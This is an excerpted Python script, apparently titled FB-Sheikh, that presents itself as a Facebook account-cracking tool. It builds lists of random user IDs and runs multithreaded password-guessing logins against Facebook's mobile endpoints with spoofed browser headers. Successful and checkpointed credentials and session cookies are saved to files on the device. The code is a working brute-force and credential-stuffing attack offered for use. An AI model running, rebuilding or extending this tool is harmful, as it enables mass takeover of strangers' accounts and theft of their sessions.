###----------[ IMPORT MODULE ]----------###
from os import path
from os import system as Sheikh
...
╚══════════════════════════════════════════╝💔"\033[1;31m""") 
    ...
    print(f"""{GREEN}    WELCOME{P}
 {K}[{H}√{K}]{P} This message is for my haters 
 {K}[{H}√{K}]{P}     {H} The Sheikh CYBER Is BACK 
...
def mainx():
    ...
    print(f'{K} [{H}8{K}] {N}Contract FB-Sheikh')
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://github.com/Khorsed12");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://www.facebook.com/profile.php?id=61550119192530");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-Sheikh {P}Terminal ');os.system("xdg-open https://www.facebook.com/profile.php?id=61550119192530?mibextid=ZbWKwL");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.Sheikh.cyber/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/profile.php?id=61550119192530?mibextid=ZbWKwL");mainx()
def mainx2():
    os.system("clear")
    banner()
    ...
    if mahin in ["1","01"]:
     ...
     mainx()
        ...
        print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/FB.Sheikh.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
...
def p1():
    ...
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            ...
            elif 'a1' in method:pool.submit(a1,idf,pwv)
...
def gf1(): 
    ...
    for nmbr in range(limit):
        ...
        idf.append(nmp)
    with tred(max_workers=40) as Sheikh_xd:
        os.system('clear')
        idx = str(len(idf))
        tk = first+last
        ...
        for number in idf:
            ...
            if mthd in ['1','01']:Sheikh_xd.submit(m1,idf,pwv)
            elif mthd in ['2','02']:Sheikh_xd.submit(m2,idf,pwv)
            elif mthd in ['3','03']:Sheikh_xd.submit(m3,idf,pwv)
            elif mthd in ['4','04']:Sheikh_xd.submit(m4,idf,pwv)
            elif mthd in ['5','05']:Sheikh_xd.submit(a1,idf,pwv)
            elif mthd in ['6','06']:Sheikh_xd.submit(f1,idf,pwv)
            else:
               Sheikh_xd.submit(m5,idf,pwv)
...
def x8():
  ...
  for nmbr in range(limit):
    ...
    nmp = ''.join(random.choice(string.digits) for _ in range(4))
    user.append(nmp)
  with tred(max_workers=30) as Sheikh_xd:
    os.system('clear')
    tl = str(len(user))
    ...
    for guru in user:
      ...
      if hc in ['1','01']:Sheikh_xd.submit(m1,idf,pwv)
      elif hc in ['2','02']:Sheikh_xd.submit(m2,idf,pwv)
      elif hc in ['3','03']:Sheikh_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:Sheikh_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:Sheikh_xd.submit(a1,idf,pwv)
      elif hc in ['6','06']:Sheikh_xd.submit(f1,idf,pwv)
      else:
       Sheikh_xd.submit(main,idf,pwv)
...
def x7():
  ...
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-Sheikh.py')
  ...
  with tred(max_workers=30) as Sheikh_xd:
    ...
    for guru in user:
     ...
     # pwv = [idf,guru,idf[:6],idf[:7],guru[1:]] #,'@#@#@#','bangladesh'] #,'@#@#@#','bangladesh','free fire','i love you']
      if 'm1' in mtd:Sheikh_xd.submit(m1,idf,pwv)
      elif 'm2' in mtd:Sheikh_xd.submit(m2,idf,pwv)
      elif 'm3' in mtd:Sheikh_xd.submit(m3,idf,pwv)
      elif 'm4' in mtd:Sheikh_xd.submit(m4,idf,pwv)
      elif 'a1' in mtd:Sheikh_xd.submit(a1,idf,pwv)
      elif 'f1' in mtd:Sheikh_xd.submit(f1,idf,pwv)
      else:
       Sheikh_xd.submit(m5,idf,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-Sheikh.py')
...
def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mSheikh","\x1b[1;92mSheikh","\x1b[1;93mSheikh","\x1b[1;94mSheikh","\x1b[1;95mSheikh","\x1b[1;96mSheikh","\x1b[1;97mSheikh","\x1b[1;91mSheikh","\x1b[1;92mSheikh","\x1b[1;93mSheikh","\x1b[1;94mSheikh","\x1b[1;95mSheikh","\x1b[1;96mSheikh"])
    ...
    for pw in pwv: 
        try:
           ...
           'sec-fetch-dest': f'{random.choice(["document"])}',
           'sec-fetch-mode': f'{random.choice(["navigate"])}',
           'sec-fetch-site': f'{random.choice(["none"])}',
           'sec-fetch-user': f'{random.choice(["?1"])}',
           'x-requested-with': 'https://m.facebook.com',
           'x-xss-protection': '0',
           'sec-ch-ua': '" Not A;Brand";v="24", "Microsoft Edge";v="101", "Chromium";v="116"',
           'sec-ch-ua-mobile': '?1'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mSheikh-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/SHEIKH-CYBER-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
                ...
                ok+=1
                print(f'\r{P} [{H}Sheikh-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis)
                open(' /sdcard/Sheikh-CYBER-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
 ...
 # gif = random.choice(["\x1b[1;91m•    ","\x1b[1;92m••   ","\x1b[1;93m•••  ","\x1b[1;94m•••• ","\x1b[1;95m•••••"])
  ...
  for pw in pwv:
    try:
      ...
      ses.headers.update({"Host": "m.alpha.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="24", "Chromium";v="116"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-dest": "document","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
      ...
      "sec-ch-ua": '"Chromium";v="116", "Google Chrome";v="106", "Not;A=Brand";v="24"',
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        if 'y' in cp_xdx:
         print(f'\r{P} [\033[1;30mSheikh-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
        open(' /sdcard/SHEIKH-CYBER-CP.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        ...
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/SHEIKH-CYBER-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [Sheikh-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki)
    ok+=1 
    open(' /sdcard/SHEIKH-CYBER-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mSheikh-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
    open(' /sdcard/SHEIKH-CYBER-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
 ...
 try:
  for ps in pw:
   ...
   header_freefb = {
                ...
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=en-GB,en-US;q=0.9,en;q=0.8',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'dpr': '2.75',
                'sec-ch-prefers-color-scheme': 'dark',
...
if __name__=='__main__':
  try:os.mkdir('SHEIKH-CYBER')
  except:pass
  try:os.mkdir('SILENT-TASKIN')
  except:pass
#  b2()
#  mainx() 
  mainx()
